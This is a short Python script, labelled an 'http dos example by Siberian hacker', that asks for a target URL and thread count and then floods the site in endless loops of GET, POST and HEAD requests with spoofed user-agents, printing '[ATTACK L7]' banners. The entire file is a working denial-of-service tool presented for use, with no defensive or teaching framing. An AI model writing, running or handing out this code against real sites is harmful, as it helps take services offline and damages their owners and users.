#http dos example by Siberian hacker
import requests
import colorama as col
import random
from threading import Thread

#colors
GREEN = col.Fore.GREEN
RED = col.Fore.RED
CYAN = col.Fore.CYAN

#colorama init.
col.init()

#user-agents
users = [
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3", "Google-Bot", "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
]
headers = {
	'User-Agent' : random.choice(users)
}

def send(url):
	while True:
		try:
		    requests.get(url, headers=headers)
		    print(GREEN+"0101001101 [ATTACK L7] 0101001101")
		    requests.post(url, headers=headers)
		   # print(RED+"0101001101 [ATTACK L7] 0101001101")
		    requests.head(url, headers=headers)
		   # print(CYAN+"0101001101 [ATTACK L7] 0101001101")
		except:
		    pass

site = input("URL > ")
thrs = input("THREADS > ")

print('running with ' + thrs + ' threads. \nattack on url: ' + site)
for i in range(int(thrs)):
    th = Thread(target=send, args=(site, ))
    th.start()